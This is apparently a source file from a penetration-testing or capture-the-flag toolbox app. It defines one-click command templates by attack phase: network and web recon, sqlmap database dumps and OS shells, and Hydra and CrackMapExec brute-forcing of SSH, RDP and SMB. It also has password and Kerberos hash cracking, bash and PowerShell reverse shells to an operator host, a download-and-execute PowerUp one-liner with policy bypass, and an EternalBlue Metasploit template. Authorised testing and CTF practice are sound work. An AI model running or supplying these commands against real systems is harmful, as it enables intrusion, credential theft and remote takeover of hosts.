import { externalCommand, localCommand } from '@/domains/toolbox/lib/capabilities';

export const SUGGESTIONS = [
  {
    category: 'Network Recon',
    items: [
      localCommand('Nmap Fast', 'nmap -F {target}', 'nmap'),
      localCommand('Nmap Full Aggressive', 'nmap -A -p- -T4 {target}', 'nmap'),
      localCommand('UDP Scan', 'nmap -sU -T4 {target}', 'nmap'),
      localCommand('Whois Lookup', 'whois {target}', 'whois'),
      localCommand('DNS Dig', 'dig {target} ANY', 'dig'),
      localCommand('Ping Loop', 'ping -c 4 {target}', 'ping'),
    ],
  },
  {
    category: 'Web Enumeration',
    items: [
      localCommand('WhatWeb', 'whatweb {target}', 'whatweb'),
      localCommand('Gobuster Dir', 'gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt', 'gobuster'),
      localCommand('FFUF Fuzz', 'ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt', 'ffuf'),
      localCommand('Curl Headers', 'curl -I http://{target}/', 'curl'),
      localCommand('Curl Verbose', 'curl -v http://{target}/', 'curl'),
      localCommand('Curl Pass Cookie', 'curl -b "session=123" http://{target}/', 'curl'),
      localCommand('Curl Burp Proxy', 'curl -x http://localhost:8080 http://{target}/', 'curl'),
    ],
  },
  {
    category: 'Windows/AD Recon',
    items: [
      localCommand('SMB Null Session', 'smbclient -L //{target} -N', 'smbclient'),
      localCommand('Enum4Linux (sim)', 'smbclient -L //{target} -N', 'smbclient'),
      localCommand('LDAP Search', 'ldapsearch -x -H ldap://{target} -b "dc=example,dc=com"', 'ldapsearch'),
    ],
  },
  {
    category: 'Database SQLi',
    items: [
      localCommand('Auto Scan', 'sqlmap -u "http://{target}/" --batch', 'sqlmap'),
      localCommand('List Databases', 'sqlmap -u "http://{target}/" --dbs', 'sqlmap'),
      localCommand('Dump DB', 'sqlmap -u "http://{target}/" --dump-all --batch', 'sqlmap'),
      localCommand('OS Shell', 'sqlmap -u "http://{target}/" --os-shell', 'sqlmap'),
    ],
  },
  {
    category: 'Advanced Recon',
    items: [
      localCommand('DNS Std Scan', 'dnsrecon -d {target} -t std', 'dnsrecon'),
      localCommand('SSL/TLS Scan', 'sslscan {target}', 'sslscan'),
      localCommand('Traceroute', 'traceroute {target}', 'traceroute'),
    ],
  },
  {
    category: 'Exploit Research',
    items: [
      localCommand('SearchSploit SMB', 'searchsploit smb', 'searchsploit'),
      localCommand('SearchSploit Apache', 'searchsploit apache 2.4', 'searchsploit'),
      localCommand('SearchSploit CVE', 'searchsploit CVE-2024-0000', 'searchsploit'),
      localCommand('SearchSploit Mirror', 'searchsploit -m 00000', 'searchsploit'),
      externalCommand('Exploit-DB', 'Visit https://www.exploit-db.com', 'Reference only; opens an external research workflow.'),
    ],
  },
  {
    category: 'Web Vulnerability Scanning',
    items: [
      localCommand('Nikto Scan', 'nikto -h http://{target}', 'nikto'),
      localCommand('Nikto HTTPS', 'nikto -h https://{target} -ssl', 'nikto'),
      localCommand('Nikto Full Tuning', 'nikto -h http://{target} -Tuning 9', 'nikto'),
      localCommand('Nikto Custom Port', 'nikto -h {target} -p 8080', 'nikto'),
      localCommand('Feroxbuster', 'feroxbuster -u http://{target} -w /usr/share/wordlists/dirb/common.txt', 'feroxbuster'),
      localCommand('Feroxbuster PHP/HTML', 'feroxbuster -u http://{target} -x php,html,txt -w /usr/share/wordlists/dirb/common.txt', 'feroxbuster'),
      localCommand('Feroxbuster No Recurse', 'feroxbuster -u http://{target} --no-recursion -w /usr/share/wordlists/dirb/common.txt', 'feroxbuster'),
    ],
  },
  {
    category: 'Brute Force',
    items: [
      localCommand('Hydra SSH', 'hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target}', 'hydra'),
      localCommand('Hydra FTP', 'hydra -l {user} -P /usr/share/wordlists/rockyou.txt ftp://{target}', 'hydra'),
      localCommand('Hydra HTTP POST', 'hydra -l {user} -P /usr/share/wordlists/rockyou.txt {target} http-post-form "/login:username=^USER^&password=^PASS^:Invalid"', 'hydra'),
      localCommand('Hydra RDP', 'hydra -l {user} -P /usr/share/wordlists/rockyou.txt rdp://{target}', 'hydra'),
      localCommand('Hydra SMB', 'hydra -l {user} -P /usr/share/wordlists/rockyou.txt smb://{target}', 'hydra'),
      localCommand('Medusa SSH', 'medusa -h {target} -u {user} -P /usr/share/wordlists/rockyou.txt -M ssh', 'medusa'),
      localCommand('CrackMapExec SMB', 'crackmapexec smb {target} -u {user} -p /usr/share/wordlists/rockyou.txt', 'crackmapexec'),
    ],
  },
  {
    category: 'Hash Cracking',
    items: [
      localCommand('Hashcat Wordlist', 'hashcat -a 0 -m 0 {hashfile} /usr/share/wordlists/rockyou.txt', 'hashcat'),
      localCommand('Hashcat NTLM', 'hashcat -a 0 -m 1000 {hashfile} /usr/share/wordlists/rockyou.txt', 'hashcat'),
      localCommand('Hashcat Brute Force (MD5)', 'hashcat -a 3 -m 0 {hashfile} ?a?a?a?a?a?a', 'hashcat'),
      localCommand('Hashcat Kerberos TGS', 'hashcat -a 0 -m 13100 {hashfile} /usr/share/wordlists/rockyou.txt', 'hashcat'),
      localCommand('John Wordlist', 'john --wordlist=/usr/share/wordlists/rockyou.txt {hashfile}', 'john'),
      localCommand('John Auto', 'john {hashfile}', 'john'),
      localCommand('John Show Cracked', 'john --show {hashfile}', 'john'),
      localCommand('John SSH Key', 'ssh2john id_rsa > id_rsa.hash && john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash', 'john'),
      localCommand('John ZIP', 'zip2john {file}.zip > zip.hash && john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash', 'john'),
      localCommand('Identify Hash', 'hash-identifier {hash}', 'hash-identifier'),
    ],
  },
  {
    category: 'Post-Exploitation',
    items: [
      localCommand('Reverse Shell Bash', 'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"', 'bash'),
      localCommand('Reverse Shell PowerShell', 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\\"{lhost}\\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\"PS \\" + (pwd).Path + \\"> \\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"', 'powershell'),
      localCommand('LinPEAS', 'curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh', 'curl'),
      localCommand('WinPEAS', 'powershell -c "iwr -UseBasicParsing https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile winpeas.exe"', 'powershell'),
      localCommand('PowerUp', 'powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1\\"); Invoke-AllChecks"', 'powershell'),
    ],
  },
  {
    category: 'Metasploit Templates',
    items: [
      localCommand('msfconsole Search', 'msfconsole -q -x "search type:exploit name:smb; exit"', 'msfconsole', 'Metasploit is not bundled in the default runtime image.'),
      localCommand('msfconsole Handler', 'msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run"', 'msfconsole', 'Metasploit is not bundled in the default runtime image.'),
      localCommand('msfconsole SMB', 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run"', 'msfconsole', 'Metasploit is not bundled in the default runtime image.'),
    ],
  },
];

export const DIFFICULTY_COLORS = { easy: '#3fb950', medium: '#d29922', hard: '#f85149' };

export const SIDEBAR_MIN_WIDTH = 260;
export const SIDEBAR_MAX_WIDTH = 420;
export const SIDEBAR_DEFAULT_WIDTH = 320;
export const SIDEBAR_RAIL_WIDTH = 72;

export const SUGGESTED_TAGS = [
  'pre-engagement', 'information-gathering', 'enumeration', 'vulnerability-assessment',
  'exploitation', 'post-exploitation', 'lateral-movement', 'proof-of-concept', 'post-engagement',
  'web', 'network', 'crypto', 'forensics', 'reverse-engineering', 'steganography',
  'privilege-escalation', 'password-cracking', 'finding', 'flag',
];
